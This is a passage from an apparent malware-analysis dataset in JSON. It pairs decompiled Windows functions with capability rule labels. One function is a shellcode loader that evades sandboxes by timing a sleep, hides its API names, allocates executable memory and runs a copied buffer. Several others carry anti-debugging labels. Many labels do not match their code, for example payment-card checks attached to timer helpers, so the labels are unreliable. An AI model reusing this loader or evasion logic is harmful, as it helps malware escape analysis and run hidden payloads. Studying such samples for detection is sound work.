) {\n                arg2_00 = puVar4;\n                uVar2 = arg2 & 1;\n                arg2._0_4_ = arg2 >> 1;\n                puVar4 = arg1;\n                if (uVar2 != 0) {\n                    puVar4 = fcn.140013f70(arg1, arg2_00);\n                    if (puVar4 == NULL) goto code_r0x000140014250;\n                    if (arg1 != NULL) {\n                        if (*(arg1 + 1) < 10) {\n                            fcn.140013b60(0);\n                            bVar5 = *0x14001bdf0 == 2;\n                            uVar1 = *(*(arg1 + 1) * 8 + 0x14001bda0);\n                            *(*(arg1 + 1) * 8 + 0x14001bda0) = arg1;\n                            *arg1 = uVar1;\n                            if (bVar5) {\n                                (*pcVar3)(0x14001be00);\n                            }\n                        }\n                        else {\n                            sub.msvcrt.dll_free(arg1);\n                        }\n                    }\n                }\n                arg1 = puVar4;\n                if (arg2 == 0) break;\n                puVar4 = *arg2_00;\n                if (*arg2_00 == NULL) {\n                    fcn.140013b60(1);\n                    puVar4 = *arg2_00;\n                    if (puVar4 == NULL) {\n                        puVar4 = fcn.140013f70(arg2_00, arg2_00);\n                        *arg2_00 = puVar4;\n                        if (puVar4 == NULL) goto code_r0x000140014250;\n                        *puVar4 = 0;\n                    }\n                    if (*0x14001bdf0 == 2) {\n                        (*pcVar3)(0x14001be28);\n                    }\n                }\n            }\n        }\n    }\n    else {\ncode_r0x000140014250:\n        arg1 = NULL;\n    }\n    return arg1;\n}\n",
        "token_count": 843
    },
    "1400077e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t * fcn.1400077e0(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int32_t **arg1_00;\n    uint64_t arg2;\n    \n    piVar4 = fcn.1400050f0(arg1);\n    piVar5 = piVar4;\n    if ((((piVar4 == NULL) || ((*(piVar4 + 0x10) & 0xc) != 0)) || (piVar5 = piVar4[0x2f],  piVar4[0x2f] != 0)) ||\n       ((piVar5 = piVar4[0x11] & 3U,  (piVar4[0x11] & 3U) != 3 ||\n        (piVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(piVar4 + 0xc)),  piVar5 != 0)))) {\n        return piVar5;\n    }\n    fcn.140009910(piVar4 + 0xe);\n    fcn.140007740();\n    piVar5 = fcn.140004ca0();\n    piVar1 = *0x1400183a0;\n    if (piVar5 == NULL) {\n        return NULL;\n    }\n    if ((*(piVar5 + 0x10) & 0xc) != 0) {\n        return piVar5;\n    }\n    iVar8 = **0x1400183a0;\n    if (iVar8 == 0) {\n        iVar6 = fcn.140008fc0();\n        iVar8 = *piVar1;\n        if (*(iVar6 + 0x18) == 0) goto code_r0x0001400078d0;\n        if (iVar8 == 0) {\n            iVar8 = fcn.140008fc0();\n        }\ncode_r0x000140007871:\n        piVar4 = *(iVar8 + 0x18);\n    }\n    else {\n        if (*(iVar8 + 0x18) != 0) goto code_r0x000140007871;\ncode_r0x0001400078d0:\n        *(iVar8 + 0x18) = 0x14001b1e0;\n        piVar4 = 0x14001b1e0;\n    }\n    if (*piVar4 == 0) {\n        return piVar4;\n    }\n    arg1_00 = piVar5 + 0xe;\n    fcn.1400095f0(arg1_00);\n    if ((((*(piVar5 + 0x10) & 3) == 0) || ((piVar5[0x11] & 1U) == 0)) || (0 < piVar5[8])) {\n        piVar5 = *arg1_00;\n        if (piVar5 + 3U < 4) {\n            piVar5 = fcn.140009570(arg1_00, piVar5);\n        }\n        if (piVar5 == NULL) {\n            return 0xc;\n        }\n        if (piVar5[1] != 0) {\n            if (*piVar5 == 0) {\n                return 0x16;\n            }\n            iVar3 = piVar5[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar3 != iVar2) {\n                return 0x1;\n            }\n            if (piVar5[4] != 0) {\n                piVar5[4] = piVar5[4] + -1;\n                return NULL;\n            }\n            piVar5[5] = -1;\n        }\n        iVar3 = *piVar5;\n        *piVar5 = 0;\n        piVar4 = NULL;\n        if (iVar3 == 2) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar5 + 2));\n            piVar4 = iVar3 == 0;\n        }\n        return piVar4;\n    }\n    piVar5[0x11] = piVar5[0x11] & 0xfffffffe;\n    *(piVar5 + 0x10) = *(piVar5 + 0x10) & 0xf3 | 4;\n    if (*(piVar5 + 0xc) != 0) {\n        (*_sym.imp.KERNEL32.dll_ResetEvent)();\n    }\n    fcn.140009910(arg1_00);\n    fcn.140007740();\n    if (arg1_00 == NULL) {\n        fcn.140004ca0();\ncode_r0x00014000797d:\n        fcn.140007840();\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.140007840();\n        return NULL;\n    }\n    uVar7 = fcn.140009360(arg1_00);\n    if (uVar7 < 0xffffffff) {\n        iVar8 = fcn.140004ca0();\n        arg2 = uVar7 & 0xffffffff;\n        if (uVar7 == 0) goto code_r0x00014000797d;\n        fcn.140007840();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    else {\n        iVar8 = fcn.140004ca0();\n        arg2 = 0xffffffff;\n        fcn.140007840();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    if (iVar8 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(arg2);\n    }\n    else {\n        fcn.140009420(iVar8, arg2);\n    }\n    fcn.140007840();\n    return NULL;\n}\n",
        "token_count": 1308
    },
    "140009ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.140009ae0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if (3 < iVar1 + 3U) {\n        if (*(iVar1 + 8) != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        sub.msvcrt.dll_free(iVar1);\n        *arg1 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 101
    },
    "14000ca9": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.14000ca90(ulong c, ulong *stream, int64_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    \n    if (((arg4 & 1) == 0) && (c == -1)) {\n        return;\n    }\n    if ((*(stream + 0x201) & 1) != 0) {\n        *arg3 = *arg3 + -1;\n        iVar1 = *(stream + 0x100c);\n        *(stream + iVar1 * 4 + 8) = c;\n        *(stream + 0x100c) = iVar1 + 1;\n        return;\n    }\n    sub.msvcrt.dll_ungetc(c, *stream);\n    *arg3 = *arg3 + -1;\n    return;\n}\n",
        "token_count": 175
    },
    "14001443": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.140014430(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uint32_t *puVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    int32_t *piVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    int32_t *piVar18;\n    bool bVar19;\n    \n    iVar3 = *(arg2 + 0x14);\n    iVar16 = *(arg1 + 0x14) - iVar3;\n    bVar19 = iVar16 < 0;\n    iVar13 = arg2;\n    if (iVar16 == 0) {\n        puVar4 = arg1 + 0x18U + iVar3;\n        puVar11 = arg2 + 0x18 + iVar3 * 4;\n        do {\n            puVar4 = puVar4 + -1;\n            puVar11 = puVar11 + -1;\n            if (*puVar4 != *puVar11) {\n                if (*puVar11 <= *puVar4) goto code_r0x00014001448f;\n                goto code_r0x0001400145bb;\n            }\n        } while (arg1 + 0x18U < puVar4);\n        iVar5 = fcn.140013c90(0);\n        if (iVar5 != 0) {\n            *(iVar5 + 0x14) = 1;\n            return iVar5;\n        }\n    }\n    else {\n        iVar16 = 0;\n        if (bVar19) {\ncode_r0x0001400145bb:\n            iVar16 = 1;\n            iVar13 = arg1;\n            arg1 = arg2;\n        }\ncode_r0x00014001448f:\n        iVar5 = fcn.140013c90(*(arg1 + 8));\n        if (iVar5 != 0) {\n            *(iVar5 + 0x10) = iVar16;\n            uVar17 = *(arg1 + 0x14);\n            uVar6 = uVar17;\n            iVar10 = 0x18;\n            uVar12 = 0;\n            puVar4 = arg1 + 0x18 + uVar6 * 4;\n            uVar1 = iVar13 + 0x18 + *(iVar13 + 0x14) * 4;\n            do {\n                iVar7 = (*(arg1 + iVar10) - uVar12) - *(iVar13 + iVar10);\n                iVar3 = iVar7;\n                *(iVar5 + iVar10) = iVar3;\n                iVar10 = iVar10 + 4;\n                uVar12 = iVar7 >> 0x20 & 1;\n            } while (iVar10 + iVar13 < uVar1);\n            uVar8 = (uVar1 - iVar13) - 0x19;\n            uVar9 = uVar8 & 0xfffffffffffffffc;\n            if (uVar1 < iVar13 + 0x19U) {\n                uVar9 = 0;\n            }\n            iVar10 = (uVar8 & 0xfffffffffffffffc) + 4;\n            iVar7 = uVar9 + iVar5 + 0x18;\n            if (uVar1 < iVar13 + 0x19U) {\n                iVar10 = 4;\n            }\n            puVar15 = arg1 + 0x18 + iVar10;\n            piVar18 = iVar5 + 0x18 + iVar10;\n            puVar11 = puVar15;\n            piVar14 = piVar18;\n            if (puVar15 < puVar4) {\n                do {\n                    uVar2 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                    iVar3 = uVar2 - uVar12;\n                    *piVar14 = iVar3;\n                    uVar12 = uVar2 - uVar12 >> 0x20 & 1;\n                    piVar14 = piVar14 + 1;\n                } while (puVar11 < puVar4);\n                iVar7 = (puVar4 + (-1 - puVar15) & 0xfffffffffffffffcU) + piVar18;\n            }\n            while (iVar3 == 0) {\n                piVar14 = iVar7 + -4;\n                iVar7 = iVar7 + -4;\n                uVar17 = uVar6 - 1;\n                uVar6 = uVar17;\n                iVar3 = *piVar14;\n            }\n            *(iVar5 + 0x14) = uVar17;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1077
    },
    "14000c9f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.14000c9f0(uint8_t **arg1, int64_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    \n    if (*(arg1 + 0x100c) == 0) {\n        if ((*(arg1 + 0x202) & 1) == 0) {\n            puVar2 = *arg1;\n            if ((*(arg1 + 0x201) & 1) == 0) {\n                uVar4 = sub.msvcrt.dll_getc();\n                if (uVar4 != -1) {\n                    *arg2 = *arg2 + 1;\n                    return uVar4;\n                }\n            }\n            else {\n                uVar1 = *puVar2;\n                if (uVar1 != 0) {\n                    *arg2 = *arg2 + 1;\n                    *arg1 = puVar2 + 1;\n                    return uVar1;\n                }\n            }\n            *(arg1 + 0x202) = *(arg1 + 0x202) | 1;\n            uVar4 = 0xffffffff;\n        }\n        else {\n            uVar4 = 0xffffffff;\n        }\n    }\n    else {\n        iVar3 = *(arg1 + 0x100c) + -1;\n        *(arg1 + 0x100c) = iVar3;\n        uVar4 = *(arg1 + iVar3 * 4 + 8);\n        *arg2 = *arg2 + 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 359
    },
    "14000154": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.140001540(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_10h_2;\n    ulong var_4h;\n    \n    var_20h = arg3;\n    var_28h = arg4;\n    uVar1 = fcn.140010340(arg1, arg2, &var_20h);\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "140008fc": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.140008fc0(void)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    char cVar7;\n    uint *puVar8;\n    char *pcVar9;\n    uint64_t uVar10;\n    bool bVar11;\n    uint uStack28;\n    \n    uStack28 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    puVar8 = &uStack28;\n    pcVar6 = 0x14001b2c0;\n    do {\n        uVar1 = *puVar8;\n        puVar8 = puVar8 + 1;\n        pcVar6[1] = (uVar1 & 0xf) + 0x61;\n        *pcVar6 = (uVar1 >> 4) + 0x41;\n        pcVar6 = pcVar6 + 2;\n    } while (puVar8 != &stack0xffffffffffffffe8);\n    cVar7 = '_';\n    pcVar9 = \"__shmem3_winpthreads_tdm_\";\n    pcVar6 = 0x14001b2c8;\n    while( true ) {\n        pcVar9 = pcVar9 + 1;\n        *pcVar6 = cVar7;\n        if (pcVar6 + 1 == 0x14001b2e2) break;\n        cVar7 = *pcVar9;\n        pcVar6 = pcVar6 + 1;\n    }\n    cVar7 = '_';\n    pcVar9 = \"__shmem3_winpthreads_tdm_\";\n    pcVar6 = 0x14001b300;\n    while( true ) {\n        pcVar9 = pcVar9 + 1;\n        *pcVar6 = cVar7;\n        if (pcVar6 + 1 == 0x14001b319) break;\n        cVar7 = *pcVar9;\n        pcVar6 = pcVar6 + 1;\n    }\n    *0x14001b319 = 0x2d;\n    *0x14001b322 = 0x6161616161616161;\n    *0x14001b332 = 0x6161616161616161;\n    *0x14001b342 = 0x6161616161616161;\n    *0x14001b352 = 0x6161616161616161;\n    *0x14001b31a = 0x6161616161616161;\n    *0x14001b32a = 0x6161616161616161;\n    *0x14001b33a = 0x6161616161616161;\n    *0x14001b34a = 0x6161616161616161;\n    *0x14001b35a = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0x14001b2c0);\n    iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar4);\n    if (iVar3 != 0) {\n        fcn.140008e40(\"failed to to lock creation mutex\\n\");\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (iVar2 == 0) {\n        puVar5 = 0x14001b31a;\n        do {\n            if ((0x14001b200U >> (0x4001b35a - puVar5 & 0x3f) & 1) != 0) {\n                *puVar5 = 0x41;\n            }\n            puVar5 = puVar5 + 1;\n        } while (puVar5 != 0x14001b35a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_AddAtomA)(0x14001b300);\n        if (iVar2 == 0) {\n            fcn.140008e40(\"failed to add string to atom table\\n\");\n            return 0;\n        }\n        *0x14001b200 = 0x14001b200;\n        sub.msvcrt.dll__onexit(0x140008ed0);\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetAtomNameA)(iVar2, 0x14001b300, 0x5b);\n        uVar10 = 0;\n        pcVar6 = 0x14001b31a;\n        if (iVar3 == 0) {\n            fcn.140008e40(\"failed to get string from atom\\n\");\n            uVar10 = 0;\n            *0x14001b200 = uVar10;\n        }\n        else {\n            do {\n                if (*pcVar6 == 'A') {\n                    uVar10 = uVar10 | 1 << (0x5aU - pcVar6 & 0x3f);\n                }\n                pcVar6 = pcVar6 + 1;\n                *0x14001b200 = uVar10;\n            } while (pcVar6 != 0x14001b35a);\n        }\n        do {\n            if (*(uVar10 + 8) == 0) {\n                if (uVar10 != 0x14001b200) {\n                    *(uVar10 + 8) = 0x14001b200;\n                    sub.msvcrt.dll__onexit(0x140008ed0);\n                }\n                break;\n            }\n            bVar11 = uVar10 != 0x14001b200;\n            uVar10 = *(uVar10 + 8);\n        } while (bVar11);\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar4);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    return *0x14001b200;\n}\n",
        "token_count": 1322
    },
    "14000927": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.140009270(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    iVar3 = *arg1;\n    if (*arg1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_QueryPerformanceFrequency)(&iStack24);\n        if (iVar1 == 0) {\n            *arg1 = -1;\n            goto code_r0x000140009294;\n        }\n        *arg1 = iStack24;\n        iVar3 = iStack24;\n    }\n    if (0 < iVar3) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&iStack16);\n        if (iVar1 != 0) {\n            return iStack16 / (*arg1 / 1000);\n        }\n    }\ncode_r0x000140009294:\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    return uVar2;\n}\n",
        "token_count": 236
    },
    "14000939": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140009390(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    \n    uVar3 = *arg1 * 1000 + (*(arg1 + 1) + 999999) / 1000000;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack16);\n    uVar2 = ((uStack12 << 0x20) + uStack16 + 0xfe624e212ac18000) / 10000;\n    iVar1 = uVar3 - uVar2;\n    if (uVar3 < uVar2) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "14000942": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.140009420(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    ulong uStack48;\n    \n    uStack48 = 0;\n    if (0xfffffffd < arg2 - 1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n        return iVar2;\n    }\n    iVar3 = fcn.140009270(&uStack48);\n    pcVar1 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n    uVar4 = arg2;\n    uVar5 = uVar4 + iVar3;\n    while( true ) {\n        iVar2 = (*pcVar1)(arg1, uVar4);\n        if (iVar2 != 0x102) {\n            return iVar2;\n        }\n        uVar4 = fcn.140009270(&uStack48);\n        if (uVar5 <= uVar4) break;\n        uVar4 = uVar5 - uVar4;\n    }\n    return 0x102;\n}\n",
        "token_count": 257
    },
    "1400094c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.1400094c0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    ulong uStack64;\n    \n    uStack64 = 0;\n    if (arg4 - 1 < 0xfffffffe) {\n        iVar3 = fcn.140009270(&uStack64);\n        pcVar1 = _sym.imp.KERNEL32.dll_WaitForMultipleObjects;\n        uVar4 = arg4;\n        uVar5 = uVar4 + iVar3;\n        while (iVar2 = (*pcVar1)(arg1, arg2, arg3, uVar4),  iVar2 == 0x102) {\n            uVar4 = fcn.140009270(&uStack64);\n            if (uVar5 <= uVar4) {\n                return 0x102;\n            }\n            uVar4 = uVar5 - uVar4;\n        }\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)();\n    }\n    return iVar2;\n}\n",
        "token_count": 267
    },
    "14000c8d": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.14000c8d0(uint64_t arg1, uint64_t *arg2, int64_t ptr)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    if (*arg2 == arg1) {\n        uVar2 = *arg2 * 2;\n        if (uVar2 < 0x100) {\n            uVar2 = 0x100;\n        }\n        if (ptr == 0) {\n            iVar1 = sub.msvcrt.dll_malloc(uVar2);\n            if (iVar1 == 0) {\n                return 0;\n            }\n        }\n        else {\n            iVar1 = sub.msvcrt.dll_realloc(ptr, uVar2);\n            if (iVar1 == 0) {\n                sub.msvcrt.dll_free(ptr);\n                return 0;\n            }\n        }\n        ptr = iVar1;\n        *arg2 = uVar2;\n    }\n    return ptr;\n}\n",
        "token_count": 207
    },
    "14001486": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140014860(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    char *pcVar7;\n    int32_t in_stack_00000028;\n    \n    iVar3 = (arg3 + 8) / 9;\n    if (arg3 < 10) {\n        arg1_01 = 0;\n    }\n    else {\n        arg1_01 = 0;\n        iVar6 = 1;\n        do {\n            iVar5 = iVar6 * 2;\n            arg1_01 = arg1_01 + 1;\n            iVar4 = iVar6 * -2;\n            iVar6 = iVar5;\n        } while (iVar3 != iVar5 && SBORROW4(iVar3, iVar5) == iVar3 + iVar4 < 0);\n    }\n    arg1_00 = fcn.140013c90(arg1_01);\n    *(arg1_00 + 0x18) = arg4;\n    *(arg1_00 + 0x14) = 1;\n    if (arg2 < 10) {\n        pcVar7 = arg1 + 9;\n        arg2._0_4_ = 9;\n    }\n    else {\n        pcVar7 = arg1 + 9;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n            arg1_00 = fcn.140013e00(arg1_00, 10, cVar2 - 0x30);\n        } while (pcVar7 != arg1 + arg2);\n    }\n    pcVar7 = pcVar7 + in_stack_00000028;\n    if (arg2 < arg3) {\n        pcVar1 = pcVar7 + ((arg3 + -1) - arg2) + 1;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n            arg1_00 = fcn.140013e00(arg1_00, 10, cVar2 - 0x30);\n        } while (pcVar1 != pcVar7);\n    }\n    return arg1_00;\n}\n",
        "token_count": 536
    },
    "1400018a": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.1400018ae(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    ulong in_R8;\n    ulong in_R9;\n    ulong var_4a0h;\n    ulong var_4a8h;\n    ulong var_4b0h;\n    ulong var_4b8h;\n    ulong var_4c0h;\n    ulong var_4cch;\n    ulong var_4f0h;\n    ulong var_4f8h;\n    uchar uStack1342;\n    uchar uStack1341;\n    uchar uStack1340;\n    uchar uStack1339;\n    uchar uStack1338;\n    uchar uStack1337;\n    uchar uStack1336;\n    uchar uStack1335;\n    uchar uStack1334;\n    uchar uStack1333;\n    uchar uStack1332;\n    uchar uStack1331;\n    uchar uStack1330;\n    uchar uStack1329;\n    uchar uStack1328;\n    uchar uStack1327;\n    uchar uStack1326;\n    uchar uStack1325;\n    uchar uStack1324;\n    uchar uStack1323;\n    uchar uStack1322;\n    uchar uStack1321;\n    ulong auStack1320 [2];\n    ulong uStack1304;\n    ulong var_56h;\n    ulong var_4dh;\n    ulong *var_40h;\n    code *var_38h;\n    uchar *var_30h;\n    uchar *puStack48;\n    double dStack40;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    fcn.140001b70();\n    iStack28 = sub.msvcrt.dll_clock();\n    (*_sym.imp.KERNEL32.dll_Sleep)(0x366);\n    iStack32 = sub.msvcrt.dll_clock();\n    dStack40 = iStack32 - iStack28;\n    if (*0x140017758 <= dStack40) {\n        auStack1320[0] = 0;\n        auStack1320[1] = 0;\n        puVar4 = &uStack1304;\n        for (iVar2 = 0x99; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        uVar1 = fcn.140001583(*0x140016010, 0x14001774e);\n        fcn.140001865(auStack1320, uVar1, in_R8, in_R9);\n        uStack1333 = 0x56;\n        uStack1332 = 0x69;\n        uStack1331 = 0x72;\n        uStack1330 = 0x74;\n        uStack1329 = 0x75;\n        uStack1328 = 0x61;\n        uStack1327 = 0x6c;\n        uStack1326 = 0x41;\n        uStack1325 = 0x6c;\n        uStack1324 = 0x6c;\n        uStack1323 = 0x6f;\n        uStack1322 = 99;\n        uStack1321 = 0;\n        puStack48 = &uStack1333;\n        uStack1342 = 0x6b;\n        uStack1341 = 0x65;\n        uStack1340 = 0x72;\n        uStack1339 = 0x6e;\n        uStack1338 = 0x65;\n        uStack1337 = 0x6c;\n        uStack1336 = 0x33;\n        uStack1335 = 0x32;\n        uStack1334 = 0;\n        var_30h = &uStack1342;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_30h);\n        var_38h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, puStack48);\n        var_40h = (*var_38h)(0, 0x4db, 0x1000, 0x40);\n        *var_40h = auStack1320[0];\n        *(var_40h + 0x4d3) = var_4dh;\n        iVar2 = var_40h - (var_40h + 1 & 0xfffffffffffffff8);\n        puVar4 = auStack1320 - iVar2;\n        puVar5 = var_40h + 1 & 0xfffffffffffffff8;\n        for (uVar3 = iVar2 + 0x4dbU >> 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        (*var_40h)();\n    }\n    return;\n}\n",
        "token_count": 1133
    },
    "14000c95": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.14000c950(ulong arg1, int64_t *arg2, ulong *arg3, ulong *arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg1 == -1) {\n        fcn.14000c840(arg2, arg4);\n        return -1;\n    }\n    iVar2 = *arg2;\n    while (iVar2 != 0) {\n        iVar1 = *(iVar2 + 8);\n        sub.msvcrt.dll_free(iVar2);\n        iVar2 = iVar1;\n    }\n    *arg2 = 0;\n    if (arg3 != NULL) {\n        sub.msvcrt.dll_free(*arg3);\n        *arg3 = 0;\n    }\n    sub.msvcrt.dll_free(*arg4);\n    *arg4 = 0;\n    return arg1;\n}\n",
        "token_count": 192
    },
    "14001099": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.140010990(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    iVar4 = *(arg1 + 0x14);\n    iVar5 = iVar4;\n    piVar2 = arg1 + 0x18;\n    do {\n        if (*piVar2 != -1) {\n            *piVar2 = *piVar2 + 1;\n            return arg1;\n        }\n        piVar1 = piVar2 + 1;\n        *piVar2 = 0;\n        piVar2 = piVar1;\n    } while (piVar1 < arg1 + 0x18 + iVar5);\n    iVar3 = arg1;\n    if (*(arg1 + 0xc) <= iVar4) {\n        iVar3 = fcn.140013c90(*(arg1 + 8) + 1);\n        sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n        fcn.140013d90(arg1);\n        iVar4 = *(iVar3 + 0x14);\n        iVar5 = iVar4;\n    }\n    *(iVar3 + 0x14) = iVar4 + 1;\n    *(iVar3 + 0x18 + iVar5 * 4) = 1;\n    return iVar3;\n}\n",
        "token_count": 334
    },
